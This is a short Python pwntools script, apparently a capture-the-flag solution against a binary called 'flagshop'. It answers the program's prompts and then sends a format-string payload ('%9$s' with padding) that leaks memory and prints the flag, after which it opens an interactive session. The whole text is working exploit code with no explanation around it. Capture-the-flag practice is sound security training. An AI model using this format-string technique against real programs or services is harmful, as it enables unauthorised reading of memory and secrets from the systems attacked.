from pwn import *

context.log_level = "warning"
exe = context.binary = ELF("flagshop")


if args.REMOTE:
	r = remote(args.HOST or "127.0.0.1", int(args.PORT or 24001))
elif args.DEBUG:
	r = exe.debug()
else:
	r = exe.process()

r.recvuntil(b"[ Enter your username ]")
name = b"whatever"
r.sendline(name)

r.recvuntil(b"[ Enter your pronouns ]")
pronouns = b"he/him"
r.sendline(pronouns)

r.recvuntil(b"==========================================")
payload = b"AABBBBBBBB%9$sCCCCCCCCCCCCCC1"
info(f"Payload will be: {payload.decode()}")
r.sendline(payload)

r.recvuntil(b"==========================================")
r.sendline(b"1")

print(f"[ FLAG Should Be Displayed Below ]: ")
print(r.recv().decode("utf8").strip().rstrip())

r.interactive()
input()
